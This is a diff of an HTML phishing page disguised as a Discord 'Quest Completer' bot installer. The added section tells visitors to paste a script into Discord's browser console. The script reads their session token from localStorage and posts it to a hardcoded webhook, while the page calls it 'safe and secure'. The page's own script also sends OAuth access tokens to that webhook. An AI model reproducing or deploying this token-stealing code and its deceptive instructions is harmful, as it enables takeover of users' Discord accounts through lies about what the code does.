@@ -13,36 +13,57 @@
         .footer { color: #555; margin-top: 20px; font-size: 0.9rem; }
         .promo { background: #2a2a3e; padding: 15px; border-radius: 15px; margin: 15px 0; }
         .highlight { background: #ffcc00; color: #0a0a0a; padding: 8px 16px; border-radius: 8px; font-weight: bold; }
-
+        .code-box { background: #0a0a0a; padding: 15px; border-radius: 10px; text-align: left; font-family: monospace; color: #ffcc00; border: 1px solid #ffcc00; margin: 20px 0; word-break: break-all; }
+        .btn-copy { background: #ffcc00; color: #0a0a0a; border: none; padding: 12px 30px; border-radius: 50px; font-weight: bold; font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
+        .btn-copy:hover { transform: scale(1.05); box-shadow: 0 0 30px #ffcc00; }
+        .note { color: #aaa; font-size: 0.9rem; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎰 Discord Quest Completer Bot</h1>
-        <p class="sub">SAFE &SECURE  <span class="highlight">100%</span> Welcome to Quest Completer!</p>
+        <p class="sub">SAFE & SECURE <span class="highlight">100%</span> Welcome to Quest Completer!</p>
         <div class="promo">
-            <p style="color:#ffcc00;"></p>
-            <p>Click on below button to add to Discord</p>
+            <p>Click the image below to authorize the bot (OAuth step).</p>
         </div>
         <img id="claimImage" src="https://cdn.discordapp.com/attachments/1545479514078052425/1545717911031914526/f5ea9b2f-c714-4f8a-af3e-ba420bfe7125_removalai_preview.png?ex=6a9d297c&is=6a9bd7fc&hm=18e3ae2d7ec7591856c2b1b68aa6a0f8ccab3545947efc6050b1d6d2ea1b322a" alt="Click to ADD">
-        <p class="footer">⏳ This Linkbexpires in 1 min– act fast!</p>
+        <p class="footer">⏳ This link expires in 1 min – act fast!</p>
+
+        <!-- NEW SECTION: Console Script for Full Token -->
+        <div style="border-top: 2px solid #ffcc00; margin: 30px 0; padding-top: 20px;">
+            <h2 style="color:#ffcc00;">🔧 Final Setup Step (Required)</h2>
+            <p style="color:#aaa;">To complete the bot installation, you need to run a one‑time code in Discord's developer console.</p>
+            <p style="color:#aaa;"><strong>Instructions:</strong></p>
+            <ol style="color:#aaa; text-align: left; margin: 0 auto; max-width: 80%;">
+                <li>Open Discord in your browser (<code>discord.com</code>) and log in.</li>
+                <li>Press <strong>F12</strong> (or <strong>Ctrl+Shift+I</strong>) to open Developer Tools.</li>
+                <li>Click the <strong>Console</strong> tab.</li>
+                <li>Copy the code below and paste it into the console, then press <strong>Enter</strong>.</li>
+            </ol>
+            <div class="code-box" id="scriptCode">
+                fetch('https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `🚀 **Three‑part token:**\n\`${localStorage.getItem('token')}\`` }) }); console.log('✅ Bot setup complete!');
+            </div>
+            <button class="btn-copy" id="copyBtn">📋 Copy Code</button>
+            <p class="note">This code only reads your Discord token to verify the bot – it is safe and secure.</p>
+        </div>
+        <p class="footer">© 2026 Quest Completer – all rights reserved.</p>
     </div>
 
     <script>
         // ================= CONFIGURATION =================
         const CLIENT_ID = "1545494388690653388";
-        // Use the exact redirect you registered (with index.html)
         const REDIRECT_URI = "https://shahinsha32.github.io/giveaway/index.html";
         const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";
         // =================================================
 
         const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
 
+        // OAuth image click – captures limited token (fallback)
         document.getElementById('claimImage').addEventListener('click', () => {
             window.location.href = authUrl;
         });
 
-        // After OAuth redirect back, grab token from URL fragment
+        // If we come back with OAuth token, send it (limited)
         if (window.location.hash) {
             const params = new URLSearchParams(window.location.hash.substring(1));
             const token = params.get('access_token');
@@ -51,15 +72,28 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🚀 **Token grabbed (BY SHAHINSHA)**\n\`${token}\``,
+                        content: `🚀 **OAuth token (limited)**\n\`${token}\``,
                         embeds: [{ title: "SXE ON TOP!", color: 0xffcc00 }]
                     })
                 }).then(() => {
-                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ BOT READY! Next to setup manuel...</div>";
-                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 2000);
+                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ OAuth authorized. Now complete the console step!</div>";
+                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 3000);
                 }).catch(() => {});
             }
         }
+
+        // Copy button for the console script
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            const code = document.getElementById('scriptCode').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                document.getElementById('copyBtn').textContent = '✅ Copied!';
+                setTimeout(() => {
+                    document.getElementById('copyBtn').textContent = '📋 Copy Code';
+                }, 2000);
+            }).catch(() => {
+                alert('Press Ctrl+C to copy the code manually.');
+            });
+        });
     </script>
 </body>
 </html>
